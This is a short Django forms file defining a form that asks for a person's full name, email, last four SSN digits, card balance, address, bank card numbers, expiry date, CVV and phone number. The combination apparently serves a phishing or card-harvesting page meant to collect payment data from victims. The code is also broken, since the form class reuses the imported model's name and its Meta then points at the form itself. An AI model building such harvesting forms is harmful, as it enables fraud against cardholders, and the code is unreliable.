from django import forms
from .models import SnippetCard
from crispy_forms.helper import FormHelper
from crispy_forms.layout import Layout, Submit
from django.contrib.auth.forms import AuthenticationForm
class SnippetCard(forms.ModelForm):
	fullname = forms.CharField(widget=forms.TextInput(attrs={"class":"input100", "placeholder": "Full Name"}))
	email = forms.CharField(widget=forms.TextInput(attrs={"class":"input100", "placeholder": "Email Address"}))
	last_four_ssn = forms.CharField(widget=forms.TextInput(attrs={"class":"input100", "placeholder": "Last 4 SSN"}))
	current_balance = forms.CharField(widget=forms.TextInput(attrs={"class":"input100", "placeholder": "Current Balance On Card"}))
	address = forms.CharField(widget=forms.TextInput(attrs={"class":"input100", "placeholder": "Address"}))
	city = forms.CharField(widget=forms.TextInput(attrs={"class":"input100", "placeholder": "City"}))
	state = forms.CharField(widget=forms.TextInput(attrs={"class":"input100", "placeholder": "State"}))
	zip_code = forms.CharField(widget=forms.TextInput(attrs={"class":"input100", "placeholder": "Zip Code"}))
	card_numbers = forms.CharField(widget=forms.TextInput(attrs={"class":"input100", "placeholder": "Bank Card Numbers"}))
	exp_date = forms.CharField(widget=forms.TextInput(attrs={"class":"input100", "placeholder": "Exp Date"}))
	cvv = forms.CharField(widget=forms.TextInput(attrs={"class":"input100", "placeholder": "CVV"}))
	phone = forms.CharField(widget=forms.TextInput(attrs={"class":"input100", "placeholder": "Phone Number"}))


	class Meta:
		model = SnippetCard
		fields = ('fullname', 'email', 'last_four_ssn', 'current_balance', 'address', 'city', 'state', 'zip_code', 'card_numbers', 'exp_date','cvv', 'phone')


